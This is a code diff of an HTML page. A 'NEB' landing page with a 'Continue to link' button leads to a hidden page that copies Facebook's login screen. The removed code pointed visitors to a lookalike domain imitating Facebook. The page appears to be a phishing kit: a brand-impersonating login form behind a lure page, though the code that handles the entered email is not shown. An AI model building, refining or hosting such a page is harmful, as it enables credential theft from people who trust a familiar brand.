@@ -15,9 +15,6 @@
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #f5f7fa 0%, #e9ecef 100%);
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
         }
 
         /* NEB PAGE STYLES */
@@ -29,6 +26,11 @@
             background: white;
             border-radius: 30px;
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
         }
 
         .title h1 {
@@ -116,7 +118,7 @@
             color: #999;
         }
 
-        /* FACEBOOK PAGE STYLES (EXACTLY AS YOUR PHOTO) */
+        /* FACEBOOK PAGE STYLES */
         .fb-container {
             display: none;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -124,12 +126,14 @@
             min-height: 100vh;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
 
         .fb-box {
             width: 100%;
             max-width: 420px;
-            padding: 20px;
+            margin: 0 auto;
+            background: transparent;
         }
 
         .fb-logo {
@@ -229,6 +233,18 @@
             margin: 10px 0;
             display: none;
         }
+
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .back-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -249,7 +265,7 @@
 
     <hr>
 
-    <button class="continue-btn" onclick="window.location.href='https://facebook0k-4scr.onrender.com'">
+    <button class="continue-btn" onclick="showFacebookPage()">
         🔗 Continue to link →
     </button>
 
@@ -258,7 +274,7 @@
     </div>
 </div>
 
-<!-- FACEBOOK PAGE (Hidden initially) -->
+<!-- FACEBOOK PAGE -->
 <div id="fbPage" class="fb-container">
     <div class="fb-box">
         <div class="fb-logo">
@@ -278,14 +294,26 @@
             <div class="fb-hr"></div>
             <button class="fb-create-btn" id="createBtn">Create new account</button>
         </div>
+        <div class="back-link">
+            <a onclick="showNEBPage()">← Back to NEB</a>
+        </div>
     </div>
 </div>
 
 <script>
-    // Check if we are on Facebook page or NEB page
-    if (window.location.pathname === '/fb' || window.location.hash === '#fb') {
+    function showFacebookPage() {
         document.getElementById('nebPage').style.display = 'none';
         document.getElementById('fbPage').style.display = 'flex';
+    }
+
+    function showNEBPage() {
+        document.getElementById('nebPage').style.display = 'block';
+        document.getElementById('nebPage').style.position = 'relative';
+        document.getElementById('nebPage').style.top = 'auto';
+        document.getElementById('nebPage').style.left = 'auto';
+        document.getElementById('nebPage').style.transform = 'none';
+        document.getElementById('nebPage').style.margin = '50px auto';
+        document.getElementById('fbPage').style.display = 'none';
     }
 
     const emailInput = document.getElementById('email');
@@ -369,6 +397,10 @@
             alert('Create new account coming soon');
         });
     }
+
+    // Initially show NEB page, hide Facebook page
+    document.getElementById('fbPage').style.display = 'none';
+    document.getElementById('nebPage').style.display = 'block';
 </script>
 
 </body>
